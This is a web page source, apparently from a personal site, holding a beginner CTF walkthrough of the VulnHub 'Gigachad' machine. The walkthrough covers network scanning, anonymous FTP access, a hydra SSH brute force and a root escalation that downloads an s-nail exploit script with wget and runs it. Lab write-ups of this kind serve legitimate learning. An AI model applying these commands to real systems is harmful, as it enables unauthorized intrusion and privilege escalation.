@@ -1,0 +1,123 @@
+---
+import Code from "../../components/Code.astro";
+import Correct from "../../components/Correct.astro";
+import Info from "../../components/icons/Info.astro";
+import Section from "../../components/SectionContainer.astro";
+import SectionText from "../../components/SectionText.astro";
+import Layout from "../../layouts/Layout.astro";
+---
+
+<Layout title="buy7or">
+    <main class="px-4">
+        <Section class="py-44 pb-12 flex justify-center items-center">
+            <img class="rounded-full size-32 border-4 border-white
+            hover:scale-105 transition" src="/images/machines/Gigachad/gigachad.jpg"/>
+        </Section>
+        <Section>
+            <h2 class="text-white text-3xl lg:text-4xl font-bold flex flex-row gap-x-2 pb-8">
+                <Info class="w-10 h-10 hover:scale-105 transition"/>Gigachad: 1
+            </h2>
+            <h4 class="font-bold text-xl lg:text-xl text-wrap pb-2">Author: <span class="font-normal">tasiyanci</span></h4>
+            <h4 class="font-bold text-xl lg:text-xl text-wrap pb-2">Level: <span class="font-normal">Beginner</span></h4>
+            <a href="https://www.vulnhub.com/entry/gigachad-1,657/" class="text-blue-400 text-xl lg:text-xl text-wrap hover:underline">
+                Machine Link
+            </a>
+            
+            <h3 class="text-white text-2xl lg:text-2xl font-bold flex flex-row gap-x-2 pt-12 pb-4">
+                Machine Discovery
+            </h3>
+            <SectionText>
+                The first step is obtaining the ip of the target machine, we will use the command
+                <Code>sudo arp-scan -I wlo1 --localnet --ignoredups</Code>
+                (you should change wlo1 with yours) and we found the ip <span class="text-lg text-green-300">192.168.1.34</span> .
+                <br>
+                <br>
+                Now we try to get the ttl of the machine for figure out the SO. For that, we will use the personal tool 
+                whichSystem.
+                <br>
+                <img class="pt-4" src="/images/machines/Gigachad/whichSystem.png"/>
+                <br>
+                We get the ttl 64 so it means the target is a Linux machine
+            </SectionText>
+            <h3 class="text-white text-2xl lg:text-2xl font-bold flex flex-row gap-x-2 pb-4">
+                Port Scanning
+            </h3>
+            <SectionText>
+                We scan the ports to see which ones are oppened and which services are running. We use the command 
+                <Code>sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.34 -oG allPorts</Code> and we get that:
+                <br>
+                <img class="pt-4" src="/images/machines/Gigachad/portDiscovery.png"/>
+                <br>
+                we check the document created allPorts and we see 
+                <span class="text-lg text-green-300">Ports: 21/open/tcp//ftp///, 22/open/tcp//ssh///, 80/open/tcp//http///</span>
+                so we know that the services that are running are ftp, ssh and http. We try to see the web http://192.168.1.34/ but we only find
+                this:
+                <br>
+                <img class="pt-4" src="/images/machines/Gigachad/web.png"/>
+                <br>
+                As we don't have any user or password to try to connect via ssh we try to use the ftp vulnerability 
+                Acceso Anonymous FTP that using the word anonymous as user and we don't use any password we can access.
+                <br>
+                We try it and it works. Now we list the directory and we see a file called chadinfo, so we bring it to our computer
+                with the command <Code>get chadinfo</Code>
+                <img class="pt-4" src="/images/machines/Gigachad/get_chadinfo.png"/>
+                <br>
+                we read the file chadinfo and we see the next content:
+                <br>
+                <img class="pt-4" src="/images/machines/Gigachad/chadinfo.png"/>
+                <br>
+                We visit the url (ip/drippinchad.png) and we see the next image:
+                <br>
+                <img class="pt-4" src="/images/machines/Gigachad/chadinfo.png"/>
+                <br>
+                After downloading the image, we performed a reverse image search on Google and identified it as a photo of Istanbul. 
+                Further research revealed that the specific location in the image was Maiden’s Tower. Based on this information, 
+                we created a custom wordlist with possible passwords such as Midenstower, maidenstower, and maidens_tower.
+
+                We then used Hydra to attempt SSH login with the following command: 
+                <Code>hydra -l chad -P wordlist.txt ssh://192.168.1.34:22</Code>
+                Hydra successfully identified the password as <span class="text-lg text-green-300">maidenstower</span>. So we connect with ssh with the next command
+                <Code>ssh chad@192.168.1.34</Code> and password maidenstower.
+                Once we are connected we list the directory and we find user.txt , we read the ifle and we obtain the first flag.
+                <br>
+                <img class="pt-4" src="/images/machines/Gigachad/flag1.png"/>
+                <br>
+            </SectionText>
+            <h3 class="text-white text-2xl lg:text-2xl font-bold flex flex-row gap-x-2 pb-4">
+                Privilege Escalation
+            </h3>
+            <SectionText>
+                With initial access secured, the next step is to escalate privileges. 
+                We begin by examining which binaries can be executed without requiring sudo permissions:<Code>sudo -l</Code> 
+                However, this yielded no actionable results. As an alternative approach, we can search for binaries that have the SUID bit set, 
+                specifically for the chad user:<Code>{'find / -perm -u=s -type f 2>/dev/null'}
+                </Code>
+                <img class="pt-4" src="/images/machines/Gigachad/permission.png"/>
+                <br>
+                Next, we searched for vulnerabilities in the services running on the target and discovered an 
+                <a href="https://www.exploit-db.com/exploits/47172" class="font-medium text-blue-400 hover:underline">exploit</a> for s-nail versions earlier than 14.8.16. We proceeded 
+                to check the version of s-nail on our target system to determine if it was vulnerable:
+                <br>
+                <img class="pt-4" src="/images/machines/Gigachad/version.png"/>
+                <br>
+                Upon verifying the version, we confirmed that the system might be vulnerable. To proceed, we downloaded the exploit script using the following command:
+                <Code>wget https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2017-5899/exploit.sh</Code>
+               
+                After downloading, we granted it the necessary execution permissions:
+                <Code>chmod 777 exploit.sh</Code>
+                <img class="pt-4" src="/images/machines/Gigachad/download.png"/>
+                <br>
+                We then executed the exploit script using: <Code>./exploit.sh</Code>
+                While the script might fail initially, persistent execution will eventually yield a root shell. 
+                In my case, it took five attempts to successfully gain root access.
+                <br>
+                <img class="pt-4" src="/images/machines/Gigachad/access.png"/>
+                <br>
+                Once we gained root access, we navigated to the /root directory and read the flag:
+                <br>
+                <img class="pt-4" src="/images/machines/Gigachad/pwned.png"/>
+                <br>
+            </SectionText>
+        </Section>
+    </main>
+</Layout>
